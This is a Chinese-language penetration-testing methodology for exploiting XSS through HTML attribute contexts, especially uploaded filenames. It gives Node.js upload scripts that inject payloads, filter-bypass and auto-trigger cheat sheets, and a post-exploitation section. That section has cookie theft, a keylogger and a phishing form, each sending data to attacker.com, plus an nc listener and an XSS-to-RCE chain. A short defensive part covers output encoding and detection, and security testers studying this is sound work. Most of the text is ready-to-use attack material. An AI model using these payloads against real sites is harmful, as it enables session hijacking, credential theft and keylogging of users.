# **HTML 属性上下文 XSS 攻击方法论**

**文档版本：** 1.0  
**创建日期：** 2026 年 3 月 15 日  
**适用 OWASP 类别：** Injection (A03:2025) - XSS

---

# **第一部分：文档概述**

## **1.1 编写目的**
本文档旨在为渗透测试人员提供一套系统化的方法论，用于检测和利用 HTML 属性上下文中的跨站脚本（XSS）漏洞。重点在于：
- 识别用户输入反射到 HTML 属性上下文的场景
- 针对不同属性上下文（value、src、href、alt 等）构造有效 Payload
- 绕过引号过滤、事件处理器过滤等防护机制
- 实现存储型和反射型 XSS 利用

## **1.2 适用范围**
本文档适用于以下类型的应用：
- 文件上传功能（文件名反射到 HTML）
- 搜索功能（关键词反射到 value 属性）
- 表单回显（用户输入反射到表单属性）
- 图片展示（用户控制 src 属性）
- 链接生成（用户控制 href 属性）
- CTF 挑战应用、博客系统、CMS

## **1.3 读者对象**
- 执行渗透测试任务的安全工程师
- 进行代码审计的安全分析师
- CTF 参赛选手
- 红队成员

---

# **第二部分：核心渗透技术专题**

## **专题一：HTML 属性上下文 XSS 原理**

### **2.1.1 技术介绍**
HTML 属性上下文 XSS 是指用户输入被反射到 HTML 标签的属性值中，由于缺乏适当的输出编码或引号转义，攻击者可以注入恶意 JavaScript 代码执行。

**常见 HTML 属性上下文：**
```html
<!-- 双引号属性 -->
<input value="USER_INPUT">
<img src="USER_INPUT">
<a href="USER_INPUT">

<!-- 单引号属性 -->
<input value='USER_INPUT'>
<img src='USER_INPUT'>

<!-- 无引号属性 -->
<input value=USER_INPUT>
<img src=USER_INPUT>
```

**漏洞本质：**
- 用户输入作为 HTML 属性值的一部分
- 未进行 HTML 实体编码（如 `"` → `&quot;`）
- 攻击者可以逃逸属性上下文，注入事件处理器或新标签

### **2.1.2 攻击常见于哪些业务场景**

| **业务场景** | **功能示例** | **HTML 上下文** | **风险点描述** |
| :--- | :--- | :--- | :--- |
| **文件上传** | 图片上传、附件管理 | `<img src="...">` | 文件名反射到 img 标签 src 属性 |
| **文件上传确认** | 上传成功消息 | `<a href='...'>here</a>` | 文件名反射到 anchor 标签 href 属性 |
| **搜索功能** | 站内搜索 | `<input value="...">` | 搜索关键词反射到 input value 属性 |
| **表单回显** | 注册/编辑表单 | `<input value="...">` | 用户输入反射到表单字段 |
| **图片展示** | 头像、相册 | `<img alt="...">` | 用户控制的 alt 文本 |
| **链接生成** | 用户资料、资源链接 | `<a href="...">` | 用户控制的 URL |
| **动态下拉菜单** | 数据库值填充 | `<option value="...">` | 数据库内容反射到 option 标签 |

### **2.1.3 漏洞探测方法**

#### **2.1.3.1 黑盒测试**

**步骤 1：识别反射点**
```bash
# 上传测试文件，检查响应
curl -X POST http://target:port/upload \
  -F "file=@test.jpg" \
  -v | grep -i "test.jpg"

# 观察文件名在 HTML 中的位置
# <img src="upload/test.jpg">  → img src 属性
# <a href='upload/test.jpg'>   → anchor href 属性（单引号）
# <input value="test.jpg">     → input value 属性
```

**步骤 2：测试特殊字符反射**
```bash
# 测试双引号
node -e "
const boundary = '----Boundary' + Math.random().toString(36);
const filename = 'test\\\".jpg';
const body = [
  '--' + boundary,
  'Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"' + filename + '\\\"',
  'Content-Type: image/jpeg',
  '',
  'test',
  '--' + boundary + '--'
].join('\\r\\n');

const resp = require('sync-request')('POST', 'http://target:port/upload', {
  headers: {'Content-Type': 'multipart/form-data; boundary=' + boundary},
  body: body
});
console.log(resp.getBody('utf8').includes('test\\\".jpg') ? '双引号未过滤' : '双引号已过滤');
"

# 测试单引号
node -e "
const filename = \"test'.jpg\";
// ... 类似上面的测试
"

# 测试尖括号
node -e "
const filename = 'test<script>.jpg';
// ... 测试是否原样输出
"
```

**步骤 3：确认 XSS 可利用性**
```bash
# 测试事件处理器注入（双引号上下文）
# 文件名：test.jpg" onmouseover="alert(1)

node -e "
const filename = 'test.jpg\\\" onmouseover=\\\"alert(1)';
// ... 上传测试
"

# 访问页面检查是否触发
curl http://target:port/ | grep -i "onmouseover"

# 测试事件处理器注入（单引号上下文）
# 文件名：test.jpg' onmouseover='alert(1)

node -e "
const filename = \"test.jpg' onmouseover='alert(1)\";
// ... 上传测试
"
```

#### **2.1.3.2 白盒测试**

**PHP 应用检测：**
```bash
# 搜索用户输入反射到 HTML 的代码
grep -r "echo.*\$_FILES" /path/to/code/
grep -r "echo.*\$_GET" /path/to/code/
grep -r "echo.*\$_POST" /path/to/code/

# 搜索 HTML 属性输出
grep -r '<img src=' /path/to/code/
grep -r '<a href=' /path/to/code/
grep -r '<input value=' /path/to/code/

# 检查是否使用 htmlspecialchars
grep -r "htmlspecialchars" /path/to/code/
grep -r "htmlentities" /path/to/code/
```

**关键代码模式分析：**
```php
// ❌ 危险模式：无编码输出
echo "<img src=\"upload/" . $_FILES['file']['name'] . "\">";
echo "<a href='upload/" . $filename . "'>here</a>";

// ⚠️ 弱编码：仅部分字符转义
echo "<input value='" . str_replace("'", "\\'", $filename) . "'>";

// ✅ 安全模式：完整 HTML 实体编码
echo "<img src=\"upload/" . htmlspecialchars($filename, ENT_QUOTES, 'UTF-8') . "\">";
```

---

## **专题二：HTML 属性上下文 XSS 利用技术**

### **2.2.1 双引号属性上下文逃逸**

**场景：`<img src="USER_INPUT">`**

#### **2.2.1.1 基础 Payload**

```bash
# Payload 结构：
# " onerror="alert(document.domain)

# 最终 HTML：
# <img src="" onerror="alert(document.domain)">

# 上传测试
node -e "
const boundary = '----Boundary' + Math.random().toString(36);
const filename = 'test.jpg\\\" onerror=\\\"alert(document.domain)';
const body = [
  '--' + boundary,
  'Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"' + filename + '\\\"',
  'Content-Type: image/jpeg',
  '',
  'test content',
  '--' + boundary + '--'
].join('\\r\\n');

require('sync-request')('POST', 'http://target:port/upload', {
  headers: {'Content-Type': 'multipart/form-data; boundary=' + boundary},
  body: body
});
console.log('Payload uploaded');
"

# 访问触发 XSS
curl http://target:port/
```

#### **2.2.1.2 高级 Payload（无引号环境）**

```bash
# 如果双引号被过滤，使用反引号或无引号语法

# 使用反引号（现代浏览器支持）
// Payload: \" onerror=\`alert(1)\`

# 使用无引号语法（简单值）
// Payload: \" onerror=alert(1)

# 使用事件处理器变体
// Payload: \" onfocus=\"alert(1)\" autofocus
// Payload: \" onload=\"alert(1)\"
// Payload: \" onmouseover=\"alert(1)\"
```

#### **2.2.1.3 标签注入绕过**

```bash
# 如果过滤了引号，直接注入新标签

# Payload: \"><script>alert(1)</script><img src=\"
# 最终 HTML：
# <img src=""><script>alert(1)</script><img src="">

node -e "
const filename = 'test.jpg\\\"><script>alert(1)</script><img src=\\\"';
// ... 上传测试
"
```

### **2.2.2 单引号属性上下文逃逸**

**场景：`<a href='USER_INPUT'>`**

#### **2.2.2.1 基础 Payload**

```bash
# Payload 结构：
# ' onmouseover='alert(document.domain)

# 最终 HTML：
# <a href='' onmouseover='alert(document.domain)''>here</a>

# 上传测试
node -e "
const boundary = '----Boundary' + Math.random().toString(36);
const filename = \"vuln.jpg' onmouseover='alert(document.domain)';
const body = [
  '--' + boundary,
  'Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"' + filename + '\\\"',
  'Content-Type: image/jpeg',
  '',
  'test content',
  '--' + boundary + '--'
].join('\\r\\n');

require('sync-request')('POST', 'http://target:port/upload', {
  headers: {'Content-Type': 'multipart/form-data; boundary=' + boundary},
  body: body
});
console.log('Payload uploaded');
"

# 访问触发（需要鼠标悬停）
curl http://target:port/ | grep -i "onmouseover"
```

#### **2.2.2.2 自动触发 Payload**

```bash
# 使用 autofocus+onfocus 自动触发
# Payload: ' onfocus='alert(1)' autofocus

# 最终 HTML：
# <a href='' onfocus='alert(1)' autofocus'>here</a>

# 或使用 onanimationstart
# Payload: ' onanimationstart='alert(1)' style='animation-name:x'

# 或使用 ontoggle
# Payload: ' ontoggle='alert(1)' details open
```

### **2.2.3 无引号属性上下文逃逸**

**场景：`<input value=USER_INPUT>`**

```bash
# Payload 结构（空格逃逸）：
# test onfocus=alert(1) autofocus

# 最终 HTML：
# <input value=test onfocus=alert(1) autofocus>

# 或使用斜杠闭合
# Payload: test/onfocus=alert(1)/autofocus/

# 最终 HTML：
# <input value=test/onfocus=alert(1)/autofocus/>
```

### **2.2.4 特殊 HTML 上下文利用**

#### **2.2.4.1 option 标签双上下文**

**场景：数据库内容渲染到 option 标签**
```html
<select name="category">
  <option value="USER_INPUT">USER_INPUT</option>
</select>
```

**利用方法：**
```bash
# Payload 需要同时逃逸 value 属性和标签内容
# Payload: " onfocus="alert(1)" autofocus x="

# 最终 HTML：
# <option value="" onfocus="alert(1)" autofocus x=""><option>

# 或使用标签闭合
# Payload: "><script>alert(1)</script><option value="

# 最终 HTML：
# <option value=""><script>alert(1)</script><option value="">
```

#### **2.2.4.2 alt 属性 + img 标签**

**场景：`<img src="..." alt="USER_INPUT">`**

```bash
# Payload 结构：
# " onerror="alert(1)

# 最终 HTML：
# <img src="valid.jpg" alt="" onerror="alert(1)">

# 注意：alt 属性通常不会触发执行，需要结合其他属性
# 更好的方法是注入完整标签
# Payload: "><script>alert(1)</script><img src="x

# 最终 HTML：
# <img src="valid.jpg" alt=""><script>alert(1)</script><img src="x">
```

#### **2.2.4.3 href 属性 javascript: 协议**

**场景：`<a href="USER_INPUT">`**

```bash
# Payload 结构：
# javascript:alert(document.domain)

# 最终 HTML：
# <a href="javascript:alert(document.domain)">click</a>

# 如果过滤了 javascript:
# 使用编码绕过
# Payload: java&#115;cript:alert(1)
# Payload: &#106;avascript:alert(1)

# 或使用 data: URL
# Payload: data:text/html,<script>alert(1)</script>
```

---

## **专题三：存储型 XSS 利用**

### **2.3.1 文件上传场景存储型 XSS**

**场景：文件名持久化存储并反射**

```bash
# 1. 上传恶意文件名
node -e "
const boundary = '----Boundary' + Math.random().toString(36);
const filename = 'test.jpg\\\" onerror=\\\"fetch(\\'http://attacker.com/steal?c=\\'+document.cookie)';
const body = [
  '--' + boundary,
  'Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"' + filename + '\\\"',
  'Content-Type: image/jpeg',
  '',
  'test content',
  '--' + boundary + '--'
].join('\\r\\n');

require('sync-request')('POST', 'http://target:port/upload', {
  headers: {'Content-Type': 'multipart/form-data; boundary=' + boundary},
  body: body
});
console.log('Stored XSS payload uploaded');
"

# 2. 文件名存储到 uploaded.txt
# 3. 每次页面加载都执行 XSS
# 4. 攻击者接收 Cookie/敏感信息
```

### **2.3.2 多上下文存储型 XSS**

**场景：同一数据源在多个 HTML 上下文渲染**

```html
<!-- 上下文 1: img src 属性 -->
<img src="upload/FILENAME">

<!-- 上下文 2: anchor href 属性 -->
<a href='upload/FILENAME'>here</a>

<!-- 上下文 3: 纯文本内容 -->
<p>Uploaded: FILENAME</p>
```

**利用方法：**
```bash
# 针对 img src 双引号上下文
# Payload: test.jpg\" onerror=\"alert(1)

# 该 Payload 同时会影响 anchor href（单引号）
# 最终 HTML：
# <img src="upload/test.jpg" onerror="alert(1)">
# <a href='upload/test.jpg" onerror="alert(1)'>here</a>  ← 单引号未闭合，XSS 失败

# 更好的通用 Payload（同时适配双引号和单引号）
# Payload: test.jpg\" onerror=\"alert(1)//

# 或使用标签注入（绕过所有属性上下文）
# Payload: \"><script>alert(1)</script><img src=\"
```

---

## **专题四：XSS 后渗透利用**

### **2.4.1 Cookie 窃取**

```bash
# Payload: 窃取 Cookie 并外带
" onerror="fetch('http://attacker.com/steal?c='+document.cookie)

# 或使用 Image 外带
" onerror="new Image().src='http://attacker.com/steal?c='+document.cookie

# 监听器（攻击者）
nc -lvnp 80
# 或
python3 -m http.server 80
```

### **2.4.2 键盘记录**

```javascript
// Payload: 键盘记录器
" onerror="document.onkeypress=function(e){fetch('http://attacker.com/key?key='+String.fromCharCode(e.which))};this.remove();
```

### **2.4.3 钓鱼攻击**

```javascript
// Payload: 注入钓鱼表单
" onerror="document.body.innerHTML='<form action=\"http://attacker.com/steal\"><input name=\"password\"><button>Submit</button></form>'
```

### **2.4.4 无认证系统 XSS 利用**

**场景：无认证文件上传应用**

```bash
# 1. 确认无认证
curl -I http://target:port/upload
# 无 Set-Cookie，无 401 响应

# 2. 上传 XSS Payload
node -e "
const boundary = '----Boundary' + Math.random().toString(36);
const filename = 'test.jpg\\\" onerror=\\\"alert(document.domain)';
const body = [
  '--' + boundary,
  'Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"' + filename + '\\\"',
  'Content-Type: image/jpeg',
  '',
  'test content',
  '--' + boundary + '--'
].join('\\r\\n');

require('sync-request')('POST', 'http://target:port/upload', {
  headers: {'Content-Type': 'multipart/form-data; boundary=' + boundary},
  body: body
});
console.log('XSS payload uploaded');
"

# 3. 访问触发 XSS
curl http://target:port/ | grep -i "onerror"
```

### **2.4.5 XSS 到 RCE 组合攻击**

**场景：XSS + 文件上传 RCE 组合**

```bash
# 1. 通过 XSS 上传 WebShell
# Payload: 上传 PHP 文件
" onerror="fetch('http://target:port/',{method:'POST',body:formData}).then(r=>r.text()).then(t=>console.log(t))

# 2. 或通过 XSS 执行命令（如果有命令执行端点）
" onerror="fetch('/api/exec?cmd=whoami').then(r=>r.text()).then(t=>console.log(t))
```

---

# **第三部分：附录**

## **3.1 HTML 属性上下文 Payload 速查表**

| **上下文** | **Payload** | **最终 HTML** |
| :--- | :--- | :--- |
| **双引号 src** | `" onerror="alert(1)` | `<img src="" onerror="alert(1)">` |
| **单引号 href** | `' onmouseover='alert(1)` | `<a href='' onmouseover='alert(1)'>` |
| **无引号 value** | `test onfocus=alert(1) autofocus` | `<input value=test onfocus=alert(1) autofocus>` |
| **标签注入** | `"><script>alert(1)</script><img src="` | `<img src=""><script>alert(1)</script>` |
| **javascript:** | `javascript:alert(1)` | `<a href="javascript:alert(1)">` |

## **3.2 事件处理器清单**

```
onerror, onload, onmouseover, onmouseout
onfocus, onblur, onclick, ondblclick
onkeydown, onkeyup, onkeypress
onsubmit, onreset, onchange, oninput
onanimationstart, onanimationend, ontransitionend
ontoggle, onscroll, onresize
```

## **3.3 自动触发技术**

```html
<!-- autofocus 自动触发 -->
<input autofocus onfocus="alert(1)">

<!-- animation 自动触发 -->
<div style="animation-name:x" onanimationstart="alert(1)">

<!-- details 自动触发 -->
<details open ontoggle="alert(1)">

<!-- marquee 自动触发（旧浏览器） -->
<marquee onstart="alert(1)">
```

## **3.4 XSS 检测清单**

| **检测项** | **检测方法** | **风险特征** |
| :--- | :--- | :--- |
| 双引号未编码 | 输入 `"` 测试 | 原样输出 |
| 单引号未编码 | 输入 `'` 测试 | 原样输出 |
| 尖括号未编码 | 输入 `< >` 测试 | 原样输出 |
| 无 htmlspecialchars | 代码审计 | 未调用编码函数 |
| 事件处理器注入 | 输入 `" onerror="` | 成功注入 |
| 标签注入 | 输入 `"><script>` | 成功注入 |

---

**文档完成**
